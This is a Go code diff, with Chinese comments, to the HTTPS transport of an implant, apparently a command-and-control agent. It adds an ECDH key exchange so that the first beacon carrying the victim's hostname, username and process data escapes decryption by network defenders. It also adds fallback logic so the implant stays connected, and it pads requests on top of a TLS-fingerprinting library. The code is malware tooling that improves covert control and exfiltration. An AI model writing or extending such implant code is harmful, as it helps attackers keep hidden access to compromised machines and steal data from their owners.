@@ -12,24 +12,20 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
-	"strings"
 	"os"
+	"strings"
 	"time"
 
 	utls "github.com/refraction-networking/utls"
 
 	"implant/core/app"
-	"implant/core/debuglog"
 	"implant/core/communication"
 	"implant/core/config"
+	"implant/core/debuglog"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
 	"implant/core/utils"
 )
-
-
-
-
 
 // NewTransport 构造 https 传输（单二进制 build tag 入口）
 // init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
@@ -49,6 +45,8 @@ func (s *HTTPSClient) IsConnected() bool { return s.connected }
 func (s *HTTPSClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }
 
 type HTTPSClient struct {
+	// kxPub 会话前 ECDH 交换得到的临时公钥（base64）；空表示未交换
+	kxPub        string
 	reconnectMgr *reconnect.ReconnectManager
 	connected    bool
 	getURL       string
@@ -139,6 +137,11 @@ func (s *HTTPSClient) Connect(host string) error {
 		s.reconnectMgr.OnReconnectAttempt()
 	}
 	s.setURLs(host)
+
+	// 会话前 ECDH 交换：必须在生成 MetaInfo **之前**（MetaInfo 含主机名/用户名/进程，
+	// 先加密再交换的话首包仍会被静态密钥解开）。失败时走静态密钥，不会失联。
+	s.kxHandshake()
+
 	if len(utils.MetaInfo) == 0 {
 		metaRaw, metaErr := utils.EncryptedMetaInfo()
 		if metaErr != nil {
@@ -213,14 +216,66 @@ func (s *HTTPSClient) applyRequestPadding(req *http.Request) {
 	req.Header.Set("X-Client-Data", string(pad))
 }
 
+// applyKxHeader 把临时公钥放进请求头（握手成功后、FirstBlood 完成前都要带）
+func (s *HTTPSClient) applyKxHeader(req *http.Request) {
+	if s.kxPub != "" {
+		req.Header.Set(encrypt.KxHeaderName, s.kxPub)
+	}
+}
+
+// kxHandshake 会话前 ECDH 交换（与 HTTPClient 同协议，见 kx.go 的说明）。
+//
+// 失败不返回错误、只清空 kxPub 并继续：交换失败应与"服务端不支持 ECDH"
+// 表现一致（走静态密钥），而不是让整条传输起不来。
+func (s *HTTPSClient) kxHandshake() {
+	s.kxPub = ""
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	req, err := http.NewRequest("GET", s.getURL, nil)
+	if err != nil {
+		return
+	}
+	req.Header.Set("User-Agent", config.UserAgent())
+	req.Header.Set(encrypt.KxHeaderName, kx.HeaderValue())
+	s.applyRequestPadding(req)
+
+	resp, err := s.client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	io.Copy(io.Discard, resp.Body)
+	if resp.StatusCode != http.StatusOK {
+		return
+	}
+	peerPub, err := encrypt.ParsePeerPublicKey(resp.Header.Get(encrypt.KxHeaderName))
+	if err != nil {
+		return // 服务端没回公钥：不支持 ECDH
+	}
+	salt, _ := app.GetListenerKeyConfig("https")
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		return
+	}
+	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
+		return
+	}
+	s.kxPub = kx.HeaderValue()
+	utils.MetaInfo = nil // 旧的 MetaInfo 是用静态密钥生成的，必须重建
+}
+
 // getRaw 发起一次 GET，仅用于 FirstBlood 探测（检查 200）。
 func (s *HTTPSClient) getRaw() error {
 	req, err := http.NewRequest("GET", s.getURL, nil)
-	req.Header.Set("User-Agent", config.UserAgent())
-if err != nil {
+	// 原实现 err 检查在 Header.Set 之后：NewRequest 失败时 req 为 nil 会先 panic
+	if err != nil {
 		return err
 	}
+	req.Header.Set("User-Agent", config.UserAgent())
 	s.applyMetadata(req)
+	s.applyKxHeader(req)
 	s.applyRequestPadding(req)
 	resp, err := s.client.Do(req)
 	if err != nil {
@@ -238,7 +293,7 @@ if err != nil {
 func (s *HTTPSClient) Recv() ([]byte, error) {
 	req, err := http.NewRequest("GET", s.getURL, nil)
 	req.Header.Set("User-Agent", config.UserAgent())
-if err != nil {
+	if err != nil {
 		return nil, err
 	}
 	s.applyMetadata(req)
@@ -290,7 +345,7 @@ if err != nil {
 func (s *HTTPSClient) SendResult(b64Packet []byte) error {
 	req, err := http.NewRequest("POST", s.postURL, strings.NewReader(string(b64Packet)))
 	req.Header.Set("User-Agent", config.UserAgent())
-if err != nil {
+	if err != nil {
 		return err
 	}
 	s.applyMetadata(req)
